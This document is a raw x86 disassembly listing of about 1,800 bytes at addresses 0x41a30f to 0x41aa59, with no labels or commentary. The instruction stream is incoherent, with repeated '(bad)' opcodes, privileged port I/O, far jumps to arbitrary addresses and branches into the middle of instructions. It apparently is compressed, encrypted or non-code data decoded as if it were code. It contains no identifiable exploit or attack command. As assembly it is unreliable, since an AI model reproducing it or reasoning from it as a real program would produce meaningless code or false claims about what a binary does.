  41a30f:	inc    esp
  41a310:	xchg   edx,eax
  41a311:	dec    esp
  41a312:	ss (bad) 
  41a314:	xchg   edi,eax
  41a315:	push   esp
  41a317:	dec    ebx
  41a318:	cwde   
  41a319:	xchg   BYTE PTR [ecx+0x52a3e7cf],cl
  41a31f:	cmp    DWORD PTR [ebx+0x6f],esp
  41a322:	ja     0x41a2bb
  41a324:	sar    DWORD PTR [eax-0x3c],1
  41a327:	repnz retf 0xcd0a
  41a32b:	jp     0x41a2ca
  41a32d:	fstp   QWORD PTR [ebp-0x472193d9]
  41a333:	sub    DWORD PTR [eax],0x1d1c9c0a
  41a339:	xchg   ecx,eax
  41a33a:	sub    ebp,DWORD PTR [eax+eiz*1]
  41a33d:	mov    dl,BYTE PTR [edx]
  41a33f:	std    
  41a340:	pop    esi
  41a341:	xchg   edi,eax
  41a342:	inc    esp
  41a343:	xor    cl,BYTE PTR [ecx]
  41a345:	cmp    BYTE PTR [eax+0x8be6182],0xfc
  41a34c:	(bad)  
  41a34d:	mov    ebx,0xb77cff7d
  41a352:	retf   
  41a353:	mov    ch,0x1
  41a355:	clc    
  41a356:	adc    cl,BYTE PTR es:[eax]
  41a359:	clc    
  41a35a:	pop    edi
  41a35b:	push   ds
  41a35c:	or     al,0x7
  41a35e:	test   eax,0x9622c5c5
  41a363:	gs push edx
  41a365:	enter  0x602f,0x99
  41a369:	push   es
  41a36a:	mov    DWORD PTR [esp+ebx*4+0x78],esp
  41a36e:	and    cl,dh
  41a370:	loope  0x41a370
  41a372:	add    DWORD PTR [edx+0x20],ecx
  41a375:	inc    eax
  41a376:	es fwait
  41a378:	ret    
  41a379:	add    dl,BYTE PTR [eiz*1-0x46ba6a00]
  41a380:	push   esp
  41a381:	adc    BYTE PTR es:[eax-0x18],dl
  41a385:	or     eax,0x5d3b747a
  41a38a:	adc    cl,cl
  41a38c:	adc    al,0xf9
  41a38e:	pop    esp
  41a38f:	mov    ds,WORD PTR [edx-0x13]
  41a392:	adc    ebx,eax
  41a394:	inc    BYTE PTR [eax]
  41a396:	inc    ecx
  41a397:	adc    BYTE PTR [ecx+0x2c],bl
  41a39a:	xchg   ebp,eax
  41a39b:	dec    ecx
  41a39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a39d:	xor    ecx,DWORD PTR [edi+eax*1]
  41a3a0:	add    ecx,DWORD PTR [ebx+ecx*8+0x24]
  41a3a4:	adc    al,0x9
  41a3a6:	mov    bl,0xb2
  41a3a8:	mov    edx,0xa4953242
  41a3ad:	fucomi st,st(6)
  41a3af:	jb     0x41a3a0
  41a3b1:	ficomp WORD PTR [ebx]
  41a3b3:	add    BYTE PTR [eax-0x46],ch
  41a3b6:	dec    esi
  41a3b7:	and    dl,BYTE PTR [ecx+0x30ca9524]
  41a3bd:	aad    0x26
  41a3bf:	pop    eax
  41a3c0:	push   ss
  41a3c1:	mov    WORD PTR [esi+0x274b4403],es
  41a3c7:	in     al,dx
  41a3c8:	xor    edx,DWORD PTR [ecx]
  41a3ca:	xor    al,0x8d
  41a3cc:	pop    esi
  41a3cd:	std    
  41a3ce:	test   cl,dl
  41a3d0:	jo     0x41a416
  41a3d2:	sub    ecx,DWORD PTR [eax]
  41a3d4:	iret   
  41a3d5:	lods   al,BYTE PTR ds:[esi]
  41a3d6:	jg     0x41a370
  41a3d8:	test   al,0x6f
  41a3da:	sbb    eax,0xa2c58801
  41a3df:	cld    
  41a3e0:	mov    ebx,0xc712f93f
  41a3e5:	(bad)  
  41a3e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3e7:	aam    0x6a
  41a3e9:	sub    eax,0xfe1f23e
  41a3ee:	icebp  
  41a3ef:	int3   
  41a3f0:	repz pop ds
  41a3f2:	in     al,0xb2
  41a3f4:	push   esi
  41a3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a3f6:	push   eax
  41a3f7:	enter  0x5971,0x6b
  41a3fb:	repnz pusha 
  41a3fd:	sti    
  41a3fe:	push   ds
  41a3ff:	adc    edx,DWORD PTR [ebp-0x3b]
  41a402:	adc    BYTE PTR [edx-0x4c2300c4],al
  41a408:	les    edx,FWORD PTR [ebx+0x1f3e7c69]
  41a40e:	add    ebp,eax
  41a410:	iret   
  41a411:	loope  0x41a401
  41a413:	adc    ebx,edx
  41a415:	aad    0x23
  41a417:	(bad)  
  41a418:	in     eax,dx
  41a419:	or     esi,DWORD PTR [esi]
  41a41b:	xchg   edi,eax
  41a41c:	xor    ah,BYTE PTR [ebx+esi*4+0x4aa24261]
  41a423:	fsub   DWORD PTR [edi-0x4fd3681d]
  41a429:	xor    al,0x22
  41a42b:	loope  0x41a43d
  41a42d:	mov    ds:0x3b395220,al
  41a432:	jecxz  0x41a415
  41a434:	ret    
  41a435:	pop    es
  41a436:	add    al,0x2
  41a438:	add    DWORD PTR [esi+0x57],edx
  41a43b:	push   edi
  41a43c:	jns    0x41a43d
  41a43e:	sti    
  41a43f:	fisttp WORD PTR [edi-0x51]
  41a442:	fbld   TBYTE PTR [edi+0x79]
  41a445:	jns    0x41a3e0
  41a447:	mov    ebp,0x9d3a1ddd
  41a44c:	push   ss
  41a44d:	ds lahf 
  41a44f:	sub    BYTE PTR [esi-0x63a3a395],0xf3
  41a456:	call   0xd163a81c
  41a45b:	sub    BYTE PTR [ebx],bl
  41a45d:	sbb    ebx,DWORD PTR [ebx+0x5fe7ddc]
  41a463:	aam    0xa9
  41a465:	mov    ch,BYTE PTR [eax]
  41a467:	or     al,BYTE PTR [ebx+eiz*8+0x31]
  41a46b:	adc    BYTE PTR [esi+ebp*2],al
  41a46e:	fistp  QWORD PTR [ecx-0x7a]
  41a471:	inc    esi
  41a472:	mov    ds:0x21dbb74e,eax
  41a477:	cdq    
  41a478:	dec    esp
  41a479:	shr    ebp,cl
  41a47b:	mov    ah,0x39
  41a47d:	cmp    DWORD PTR [esi],edi
  41a47f:	inc    esi
  41a480:	xlat   BYTE PTR ds:[ebx]
  41a481:	jne    0x41a449
  41a483:	jecxz  0x41a4b6
  41a485:	int    0x46
  41a487:	cmp    esi,0xffffffa0
  41a48a:	dec    edi
  41a48b:	sbb    BYTE PTR fs:[ebp-0x75dd9327],ah
  41a492:	add    bl,cl
  41a494:	pop    esp
  41a495:	push   ds
  41a496:	shl    DWORD PTR [eax],cl
  41a498:	imul   esi,DWORD PTR [ebx+ebx*8+0xdae59f],0xaeb9537c
  41a4a3:	add    bh,BYTE PTR [ebx+edx*1+0x79]
  41a4a7:	out    0xb9,al
  41a4a9:	idiv   ebp
  41a4ab:	aad    0xf1
  41a4ad:	fs cld 
  41a4af:	pop    esp
  41a4b0:	cmp    al,0x9e
  41a4b2:	and    BYTE PTR [edx+ecx*4],dl
  41a4b5:	mov    al,ds:0x952ca74e
  41a4ba:	dec    ebx
  41a4bb:	enter  0x48a2,0x28
  41a4bf:	adc    al,0x26
  41a4c1:	xchg   ebp,eax
  41a4c2:	sahf   
  41a4c3:	dec    ebp
  41a4c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4c5:	mov    dh,0x4c
  41a4c7:	mov    edi,DWORD PTR [eax+0x3c]
  41a4ca:	dec    esi
  41a4cb:	sub    dl,BYTE PTR [ebp-0x5ea5431e]
  41a4d1:	xlat   BYTE PTR ds:[ebx]
  41a4d2:	jmp    0x41a465
  41a4d4:	int    0x66
  41a4d6:	rcl    DWORD PTR [ebp+ebx*4-0x7d],1
  41a4da:	std    
  41a4db:	jge    0x41a4e3
  41a4dd:	std    
  41a4de:	add    DWORD PTR [ecx+0x30d30060],eax
  41a4e4:	sbb    ah,dh
  41a4e6:	sti    
  41a4e7:	sub    BYTE PTR [edx+0x26e6c6c2],cl
  41a4ed:	mov    DWORD PTR [eax-0x74],edi
  41a4f0:	je     0x41a518
  41a4f2:	dec    ebx
  41a4f3:	and    BYTE PTR [eax],dl
  41a4f5:	loopne 0x41a4b3
  41a4f7:	jb     0x41a4bf
  41a4f9:	in     eax,0xc5
  41a4fb:	add    eax,0x6980204a
  41a500:	call   0x43c6:0x4c6b2ed4
  41a507:	inc    edx
  41a508:	mov    eax,ds:0x1b9b1b10
  41a50d:	test   BYTE PTR [edx+0x61],al
  41a510:	or     al,BYTE PTR [ebp-0x678f1ede]
  41a516:	aaa    
  41a517:	fistp  QWORD PTR [eax-0x7d]
  41a51a:	cmp    ebp,0x7d
  41a51d:	ror    DWORD PTR es:[ecx],cl
  41a520:	sar    DWORD PTR [eax+0x1c],1
  41a523:	dec    ecx
  41a524:	xchg   edx,eax
  41a525:	mov    al,0x2c
  41a527:	xchg   ebx,eax
  41a528:	loop   0x41a4fc
  41a52a:	and    ah,BYTE PTR [esi+0x54ad509]
  41a530:	push   ebp
  41a531:	push   ebp
  41a532:	adc    DWORD PTR ds:0xcdbb6e99,esp
  41a538:	pusha  
  41a539:	shl    BYTE PTR [ebx],1
  41a53b:	adc    al,0xa
  41a53d:	mov    dl,0x58
  41a53f:	pop    esp
  41a540:	inc    eax
  41a541:	shl    BYTE PTR [edi+edx*8-0x7974ec93],0x19
  41a549:	or     eax,0x9e5c5c06
  41a54e:	and    ecx,DWORD PTR [edx]
  41a550:	add    ch,cl
  41a552:	push   esp
  41a553:	xchg   edx,eax
  41a554:	pop    eax
  41a555:	xor    al,0x4c
  41a557:	mov    ds:0xa75344d1,eax
  41a55c:	or     BYTE PTR [edx+0x623c68c8],al
  41a562:	rcr    BYTE PTR [edi],1
  41a564:	push   eax
  41a565:	sub    dl,BYTE PTR [edi+0x1cfdf9f0]
  41a56b:	sbb    eax,0xbbb3b11d
  41a570:	mov    esp,DWORD PTR [esi+0x19d3a469]
  41a576:	push   edx
  41a577:	test   eax,0x654b8b24
  41a57c:	repnz test DWORD PTR [edi+ebp*2],edi
  41a580:	mov    esi,0xe7e73afe
  41a585:	out    0xe8,eax
  41a587:	xchg   cl,al
  41a589:	(bad)  
  41a58a:	(bad)  
  41a58b:	push   ss
  41a58c:	mov    dl,0x2c
  41a58e:	shr    edi,1
  41a590:	div    DWORD PTR [ecx]
  41a592:	dec    ebp
  41a593:	or     ecx,DWORD PTR [ebp-0x29]
  41a596:	shl    DWORD PTR ds:0xd8df59d,1
  41a59c:	mov    dl,0x99
  41a59e:	or     al,0xf
  41a5a0:	out    dx,al
  41a5a1:	fbld   TBYTE PTR [edi+0x4a23a8de]
  41a5a7:	and    ah,BYTE PTR [ebp-0x6868cd0e]
  41a5ad:	pop    ss
  41a5ae:	push   esp
  41a5af:	sub    edx,DWORD PTR ds:0xb16962c0
  41a5b5:	inc    esp
  41a5b6:	cmp    BYTE PTR [edx],dl
  41a5b8:	es sbb al,0x89
  41a5bb:	shr    bh,cl
  41a5bd:	cmc    
  41a5be:	adc    DWORD PTR [ecx+eax*4],eax
  41a5c1:	cmc    
  41a5c2:	lea    ecx,ds:0x8718d122
  41a5c8:	pop    es
  41a5c9:	sti    
  41a5ca:	inc    esp
  41a5cb:	mov    ds:0x57565631,al
  41a5d0:	cmp    DWORD PTR ds:0x4d34c13d,edi
  41a5d6:	ss mov bh,0x6e
  41a5d9:	shr    BYTE PTR [esi+esi*1+0x8],1
  41a5dd:	sub    ah,BYTE PTR [ecx]
  41a5df:	mov    dl,0xd9
  41a5e1:	sbb    al,0x2
  41a5e3:	push   eax
  41a5e4:	stos   DWORD PTR es:[edi],eax
  41a5e5:	aad    0xc2
  41a5e7:	lahf   
  41a5e8:	cli    
  41a5e9:	in     al,dx
  41a5ea:	lahf   
  41a5eb:	sti    
  41a5ec:	mov    ch,0xff
  41a5ee:	out    dx,eax
  41a5ef:	ud0    ebp,DWORD PTR [ebp-0xfd0f207]
  41a5f6:	idiv   DWORD PTR [eax+0x6f801b5c]
  41a5fc:	and    BYTE PTR [edi-0x8],bl
  41a5ff:	mov    ecx,0xb249885f
  41a604:	cld    
  41a605:	mov    bh,0xc
  41a607:	ret    
  41a608:	dec    eax
  41a609:	jmp    0xfb87:0xf8f3369a
  41a610:	xchg   esp,eax
  41a611:	dec    ebx
  41a612:	dec    ebx
  41a613:	add    al,0x43
  41a615:	inc    ecx
  41a616:	mov    cs,WORD PTR [edi+0x1224498f]
  41a61c:	(bad)
  41a620:	mov    bh,0x1f
  41a622:	xor    DWORD PTR [ebp+0x55],edx
  41a625:	mov    dl,0xb9
  41a627:	sbb    al,0xd5
  41a629:	push   0xffffff85
  41a62b:	mov    ecx,DWORD PTR [ebx+0x1261a62a]
  41a631:	or     BYTE PTR [ecx+ebp*8],al
  41a634:	idiv   BYTE PTR [edx-0x359c39b4]
  41a63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a63b:	mov    cl,BYTE PTR gs:[ebx-0x2df4d3bb]
  41a642:	cdq    
  41a643:	sub    al,0x9a
  41a645:	stos   BYTE PTR es:[edi],al
  41a646:	xor    bl,BYTE PTR [eax]
  41a648:	or     al,0x9
  41a64a:	xchg   ebx,eax
  41a64c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a64d:	rcr    BYTE PTR [ecx],cl
  41a64f:	div    BYTE PTR [edi-0x9]
  41a652:	mov    eax,0x8f18d7ac
  41a657:	xchg   BYTE PTR [esp+edx*1],ch
  41a65a:	or     al,BYTE PTR [edx+eiz*4+0x51]
  41a65e:	add    al,0x41
  41a660:	and    BYTE PTR [ebp+0x169a62cd],bl
  41a666:	(bad)  [esi+0x7]
  41a669:	fldenv [edi]
  41a66b:	jecxz  0x41a604
  41a66d:	jge    0x41a60b
  41a66f:	pushf  
  41a670:	sahf   
  41a671:	shr    bl,1
  41a673:	jne    0x41a6a6
  41a675:	or     al,0x83
  41a677:	pop    ebx
  41a678:	mov    bh,0x6e
  41a67a:	xchg   edx,eax
  41a67b:	int    0x64
  41a67d:	dec    ecx
  41a67e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a67f:	shr    BYTE PTR [edi+edx*4],cl
  41a682:	dec    edx
  41a683:	pushf  
  41a684:	push   esi
  41a685:	into   
  41a686:	js     0x41a678
  41a688:	loopne 0x41a68b
  41a68a:	lea    esp,[esi-0x75]
  41a68d:	pop    eax
  41a68e:	xor    al,0xca
  41a690:	fcmovu st,st(2)
  41a692:	sbb    al,BYTE PTR [ecx-0x72326fa0]
  41a698:	xor    eax,0xcde45124
  41a69d:	jnp    0x41a696
  41a69f:	(bad)  
  41a6a1:	(bad)  [ebx+0x32]
  41a6a4:	cdq    
  41a6a5:	mov    dl,0x50
  41a6a7:	pop    esp
  41a6a8:	and    BYTE PTR [ebx+0x264c934e],dl
  41a6ae:	pop    ecx
  41a6af:	pop    esi
  41a6b0:	cs jae 0x41a72b
  41a6b3:	js     0x41a679
  41a6b5:	add    DWORD PTR [edi-0x31a956f1],0x49
  41a6bc:	xor    ch,BYTE PTR [si-0x54]
  41a6c0:	scas   eax,DWORD PTR es:[edi]
  41a6c1:	adc    cl,BYTE PTR [ebx+0x5b5f58c5]
  41a6c7:	inc    ebp
  41a6c8:	xlat   BYTE PTR ds:[ebx]
  41a6c9:	jne    0x41a689
  41a6cb:	repnz in eax,0xd7
  41a6ce:	jmp    0x653aa0e2
  41a6d3:	pop    ds
  41a6d4:	mov    bh,0x6e
  41a6d6:	fld    QWORD PTR [eax]
  41a6d8:	inc    ecx
  41a6d9:	inc    esp
  41a6da:	adc    al,0x25
  41a6dc:	inc    esp
  41a6dd:	inc    ecx
  41a6de:	mov    al,ds:0x1c336edd
  41a6e3:	push   cs
  41a6e4:	sub    DWORD PTR [esi],edx
  41a6e6:	pop    ss
  41a6e7:	xchg   ecx,eax
  41a6e8:	mov    DWORD PTR gs:[ebp+0x79d84f27],ebx
  41a6ef:	mov    dl,0x8b
  41a6f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6f2:	test   eax,0x20dd6d6c
  41a6f7:	adc    DWORD PTR [edi+0x10],ecx
  41a6fa:	(bad)  
  41a6fb:	lds    edx,FWORD PTR [eax]
  41a6fd:	add    al,0x81
  41a6ff:	inc    esi
  41a700:	lods   eax,DWORD PTR ds:[esi]
  41a701:	mov    fs,WORD PTR [esi+0x6fadac69]
  41a707:	xor    BYTE PTR [ecx-0xf0b87b4],bl
  41a70d:	ds int 0x46
  41a710:	adc    DWORD PTR [edx+0x3e39495d],0x3c
  41a717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a718:	(bad)  [ecx-0x6d]
  41a71b:	int    0xce
  41a71d:	ds xchg edi,eax
  41a71f:	xor    BYTE PTR [ebx],al
  41a721:	test   DWORD PTR [eax],0x53a44286
  41a727:	imul   eax,edx,0xd1a330e1
  41a72d:	mov    BYTE PTR [edx+esi*1+0x45],dl
  41a731:	sub    al,0x11
  41a733:	(bad)  
  41a734:	aam    0x75
  41a736:	ret    0x30e1
  41a739:	push   ss
  41a73a:	push   ss
  41a73b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a73c:	imul   edx,DWORD PTR [edx-0x53],0xdccf5354
  41a743:	mov    esi,0xf6fd7ff3
  41a748:	push   ebx
  41a74a:	das    
  41a74b:	push   0xffffffef
  41a74d:	idiv   BYTE PTR [ebp-0xc]
  41a750:	(bad)  [edi+edx*8]
  41a753:	sub    eax,eax
  41a755:	aaa    
  41a756:	nop
  41a757:	jl     0x41a77a
  41a759:	jg     0x41a712
  41a75b:	jp     0x41a7bb
  41a75d:	pop    ebx
  41a75e:	dec    ecx
  41a75f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a760:	xor    ebx,DWORD PTR [edi+edx*2+0x3b76e8cf]
  41a767:	dec    esp
  41a768:	daa    
  41a769:	adc    ebp,DWORD PTR [edx-0xd1af52b]
  41a76f:	xor    cl,ch
  41a771:	inc    esi
  41a772:	add    ebx,DWORD PTR [ecx+0x12]
  41a775:	xchg   ecx,eax
  41a776:	inc    esp
  41a777:	adc    DWORD PTR [ebp+0x33],ebx
  41a77a:	cmp    BYTE PTR [edi],bh
  41a77c:	aas    
  41a77d:	daa    
  41a77e:	adc    al,0xa
  41a780:	adc    cl,BYTE PTR [ebx-0x244b173b]
  41a786:	je     0x41a803
  41a788:	cmp    eax,0x85badc6e
  41a78d:	in     al,dx
  41a78e:	xchg   ebx,eax
  41a78f:	push   0xba681bd4
  41a794:	xchg   BYTE PTR [esi+0x19326419],ch
  41a79a:	jb     0x41a721
  41a79c:	add    eax,0x6c2bcfce
  41a7a1:	aas    
  41a7a2:	jp     0x41a7e4
  41a7a4:	xor    al,0x96
  41a7a6:	pusha  
  41a7a7:	ins    DWORD PTR es:[edi],dx
  41a7a8:	jne    0x41a737
  41a7aa:	dec    eax
  41a7ab:	sub    al,0x42
  41a7ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7ae:	rol    DWORD PTR [ebx+ecx*8],cl
  41a7b1:	inc    edx
  41a7b2:	push   ecx
  41a7b3:	add    al,BYTE PTR [edx+eiz*1+0x31]
  41a7b7:	loop   0x41a7aa
  41a7b9:	add    al,0xc9
  41a7bb:	push   esp
  41a7bc:	and    BYTE PTR [ebx-0x6189dc3d],0x3c
  41a7c3:	inc    ecx
  41a7c4:	xchg   edx,eax
  41a7c5:	and    eax,0xb26f3736
  41a7ca:	mov    cl,0xb9
  41a7cc:	mov    DWORD PTR [ecx+0x17142c1b],esp
  41a7d2:	call   0x278e624b
  41a7d7:	adc    edi,DWORD PTR [edx-0x43]
  41a7da:	rcl    DWORD PTR ds:[eax+0x10],0x2c
  41a7df:	nop
  41a7e0:	and    al,0x9
  41a7e2:	pop    ebp
  41a7e3:	rcl    DWORD PTR [eax+0x30509124],cl
  41a7e9:	inc    eax
  41a7ea:	xor    al,0x1a
  41a7ec:	and    eax,0x9ba10a12
  41a7f1:	es mov ebp,0x64c9975e
  41a7f7:	int3   
  41a7f8:	jo     0x41a832
  41a7fa:	and    bl,BYTE PTR [esi+ecx*1]
  41a7fd:	and    DWORD PTR [ecx+0x12],ecx
  41a800:	loope  0x41a872
  41a802:	cwde   
  41a803:	jo     0x41a835
  41a805:	mov    BYTE PTR [ecx+0x1a],ah
  41a808:	push   0xecb209d3
  41a80d:	ret    
  41a80e:	xor    al,0xd
  41a810:	je     0x41a85f
  41a812:	cmp    BYTE PTR [bp+si],bl
  41a815:	rcr    DWORD PTR [edi],1
  41a817:	or     al,0xd0
  41a819:	push   esp
  41a81a:	xchg   ebp,eax
  41a81b:	fs xor cl,cl
  41a81e:	jo     0x41a854
  41a820:	and    al,0x57
  41a822:	enter  0x7a73,0x7a
  41a826:	(bad)  
  41a827:	into   
  41a828:	into   
  41a829:	cs stos BYTE PTR es:[edi],al
  41a82b:	stos   BYTE PTR es:[edi],al
  41a82c:	mov    dl,0xb9
  41a82e:	mov    ch,0xc9
  41a830:	mov    bl,0x77
  41a832:	out    dx,eax
  41a833:	xchg   edx,eax
  41a834:	int    0xe5
  41a836:	enter  0x7365,0x4c
  41a83a:	es xchg ebx,eax
  41a83c:	pop    ecx
  41a83d:	mov    gs,WORD PTR [edi+0x1a]
  41a840:	sbb    BYTE PTR [esi-0x56b15572],al
  41a846:	push   esi
  41a847:	sub    cl,BYTE PTR [esi+eax*8+0x34a95263]
  41a84e:	ja     0x41a83e
  41a850:	fisub  WORD PTR [ebp+0x79497976]
  41a856:	jns    0x41a7f1
  41a858:	push   0xffffffb5
  41a85a:	and    BYTE PTR [esi+0x913c469],0x2c
  41a861:	retf   
  41a862:	in     al,0xf1
  41a864:	mov    ds:0x1e1f1c47,eax
  41a869:	xchg   ecx,eax
  41a86a:	dec    edx
  41a86b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a86c:	(bad)  
  41a86e:	fsub   QWORD PTR [edx-0x9]
  41a871:	leave  
  41a872:	adc    ebx,DWORD PTR [edx]
  41a874:	int    0x6
  41a876:	jmp    0x41a863
  41a878:	sbb    ebp,DWORD PTR [esi+ebp*1]
  41a87b:	cs push edx
  41a87d:	lods   eax,DWORD PTR ds:[esi]
  41a87e:	push   esp
  41a87f:	imul   esi,DWORD PTR [edi+0x2eaeac9a],0xe8776ad3
  41a889:	jne    0x41a846
  41a88b:	in     al,0xb
  41a88d:	or     ebx,DWORD PTR [edi+ebx*1]
  41a890:	sbb    eax,0x4da69a62
  41a895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a896:	adc    dl,BYTE PTR [ebp+0x31f870c1]
  41a89c:	loopne 0x41a89c
  41a89e:	mov    ebx,0x377d1f7d
  41a8a3:	retf   
  41a8a4:	mov    ch,0x1
  41a8a6:	clc    
  41a8a7:	push   es
  41a8a8:	mov    dl,0x7f
  41a8aa:	jo     0x41a8a4
  41a8ac:	stc    
  41a8ad:	js     0x41a8eb
  41a8af:	sub    BYTE PTR cs:[edx-0x80],cl
  41a8b3:	jo     0x41a8ed
  41a8b5:	inc    edx
  41a8b6:	ss fwait
  41a8b8:	addr16 xor al,0x1c
  41a8bb:	shr    cl,cl
  41a8bd:	mov    ah,0x59
  41a8bf:	pop    ecx
  41a8c0:	pop    ecx
  41a8c1:	and    eax,0x6ad18f16
  41a8c6:	mov    dh,0x59
  41a8c8:	pop    edx
  41a8c9:	sub    dl,BYTE PTR [ecx+0x3d3817cb]
  41a8cf:	ds ret 0x57ef
  41a8d3:	pop    eax
  41a8d4:	pop    edx
  41a8d5:	sub    ah,BYTE PTR [ebx-0x27]
  41a8d8:	and    eax,DWORD PTR [ecx-0x1ec17c7a]
  41a8de:	jo     0x41a864
  41a8e0:	push   0xefcf8624
  41a8e5:	arpl   WORD PTR [edi+0x6f],di
  41a8e8:	(bad)  
  41a8e9:	shr    DWORD PTR [eax-0x78],1
  41a8ec:	and    al,0xcb
  41a8ee:	call   0x4a6a2f9d
  41a8f3:	hlt    
  41a8f4:	mov    edx,0xe2c12c6d
  41a8f9:	imul   ch
  41a8fb:	cmp    eax,DWORD PTR [edx+eax*4+0x891c221]
  41a902:	std    
  41a903:	rol    DWORD PTR [eax+0x6e8dbb4e],0xe8
  41a90a:	sub    BYTE PTR [esi+0x1f],bh
  41a90d:	mov    edx,0x265a63ae
  41a912:	jecxz  0x41a912
  41a914:	or     BYTE PTR [edi-0x6f5e981e],bh
  41a91a:	inc    edi
  41a91b:	push   ecx
  41a91c:	adc    al,0xb2
  41a91e:	fldcw  WORD PTR [ebp*8+0x5fd79b56]
  41a925:	jg     0x41a92a
  41a927:	push   ebp
  41a928:	popf   
  41a929:	xor    bl,BYTE PTR [ebp-0x661987b2]
  41a92f:	cmp    ecx,DWORD PTR [eax-0x6e]
  41a932:	test   BYTE PTR [eax],ah
  41a934:	inc    eax
  41a935:	cmp    al,0x96
  41a937:	loopne 0x41a8fa
  41a939:	mov    ds:0x1e1d1cc7,eax
  41a93e:	xchg   edx,eax
  41a93f:	dec    ecx
  41a940:	addr16 pop eax
  41a942:	pop    ebx
  41a943:	pop    ebx
  41a944:	jecxz  0x41a91c
  41a946:	lods   eax,DWORD PTR ds:[esi]
  41a947:	pop    ebx
  41a948:	pushf  
  41a949:	popf   
  41a94a:	push   ebp
  41a94b:	pop    eax
  41a94c:	pop    edi
  41a94d:	pop    edi
  41a94e:	mov    ds:0x78706f5e,eax
  41a953:	je     0x41a921
  41a955:	js     0x41a98b
  41a957:	bound  esp,QWORD PTR [ebx+0x63]
  41a95a:	popf   
  41a95b:	test   DWORD PTR [ebp+0x13a6ba02],eax
  41a961:	dec    edi
  41a962:	les    ecx,FWORD PTR [ecx+0x24]
  41a965:	loop   0x41a923
  41a967:	jns    0x41a958
  41a969:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a96d:	inc    esp
  41a96e:	jecxz  0x41a9a1
  41a970:	pop    esi
  41a971:	js     0x41a954
  41a973:	add    eax,0x25f97a5e
  41a978:	mov    edx,0x4b8b1edd
  41a97d:	inc    ebp
  41a97e:	mov    dh,0x1f
  41a980:	outs   dx,DWORD PTR ds:[esi]
  41a981:	push   ebx
  41a982:	mov    ebx,0x743744bc
  41a987:	(bad)  
  41a988:	(bad)  
  41a989:	xlat   BYTE PTR ds:[ebx]
  41a98a:	or     DWORD PTR [edx+eax*1],eax
  41a98d:	sbb    BYTE PTR [edx+0x663278ce],bh
  41a993:	stos   BYTE PTR es:[edi],al
  41a994:	stos   BYTE PTR es:[edi],al
  41a995:	adc    al,0x8a
  41a997:	mov    ebp,DWORD PTR [eax-0x66]
  41a99a:	retf   0xdbad
  41a99d:	mov    bh,0x39
  41a99f:	cmp    bh,BYTE PTR [edx]
  41a9a1:	addr16 sbb cx,WORD PTR [di-0x2d]
  41a9a7:	leave  
  41a9a8:	in     eax,0xf2
  41a9aa:	test   bl,al
  41a9ac:	and    DWORD PTR [ebx+edx*8],ecx
  41a9af:	mov    al,ds:0xa21af5e
  41a9b4:	add    bl,BYTE PTR [ebx+0x2648379b]
  41a9ba:	push   ebx
  41a9bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9bc:	push   edx
  41a9bd:	dec    ecx
  41a9be:	div    BYTE PTR [esi+0x77]
  41a9c1:	adc    DWORD PTR ds:0xca2c6891,esp
  41a9c7:	jmp    0x748db95
  41a9cc:	sti    
  41a9cd:	sbb    BYTE PTR [esi+0x5266b989],al
  41a9d3:	stos   DWORD PTR es:[edi],eax
  41a9d4:	pop    ebp
  41a9d5:	mov    dl,0xf3
  41a9d7:	fs fwait
  41a9d9:	in     eax,0xd5
  41a9db:	xor    eax,0xbb28d1a2
  41a9e0:	mov    ebx,0x2952a43b
  41a9e5:	add    al,BYTE PTR [ecx]
  41a9e7:	test   DWORD PTR [edx-0x4b],ebp
  41a9ea:	dec    edx
  41a9eb:	and    bl,BYTE PTR [esi+0x121c3060]
  41a9f1:	push   cs
  41a9f2:	test   eax,ebp
  41a9f4:	jbe    0xf5bfb199
  41a9fa:	fnstsw WORD PTR [ebp-0x1a444175]
  41aa00:	cmp    al,BYTE PTR ds:0xb3f23af8
  41aa06:	aas    
  41aa07:	dec    DWORD PTR [ebx]
  41aa09:	push   edx
  41aa0a:	stos   DWORD PTR es:[edi],eax
  41aa0b:	aad    0xfe
  41aa0d:	stc    
  41aa0e:	xor    dh,BYTE PTR fs:[ebp-0x76d96698]
  41aa15:	inc    esp
  41aa16:	xor    BYTE PTR [eax+0x34],0x42
  41aa1a:	and    bh,BYTE PTR [esi]
  41aa1c:	or     ecx,ebx
  41aa1e:	pop    ss
  41aa1f:	pop    ss
  41aa20:	dec    ebx
  41aa21:	test   bl,al
  41aa23:	popa   
  41aa24:	push   esp
  41aa25:	jne    0x41a9f1
  41aa27:	ret    0x9142
  41aa2a:	je     0x41aa56
  41aa2c:	mov    DWORD PTR [edx],edx
  41aa2e:	or     al,0xe1
  41aa30:	idiv   ebx
  41aa32:	xchg   ecx,eax
  41aa33:	inc    esp
  41aa34:	xchg   ecx,eax
  41aa35:	inc    eax
  41aa36:	xor    BYTE PTR [eax-0x4f],cl
  41aa39:	pop    eax
  41aa3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa3b:	fucomi st,st(3)
  41aa3d:	jb     0x41aabb
  41aa3f:	js     0x41a9c9
  41aa41:	sub    BYTE PTR [eax],cl
  41aa43:	test   dl,al
  41aa45:	popa   
  41aa46:	sub    ah,BYTE PTR [edi-0x59]
  41aa49:	hlt    
  41aa4a:	jp     0x41aa89
  41aa4c:	push   esp
  41aa4d:	jne    0x41aa19
  41aa4f:	fcmovu st,st(2)
  41aa51:	sbb    dh,BYTE PTR [edx+0x1a2003ec]
  41aa57:	mov    DWORD PTR [edx],esp
  41aa59:	dec    ecx
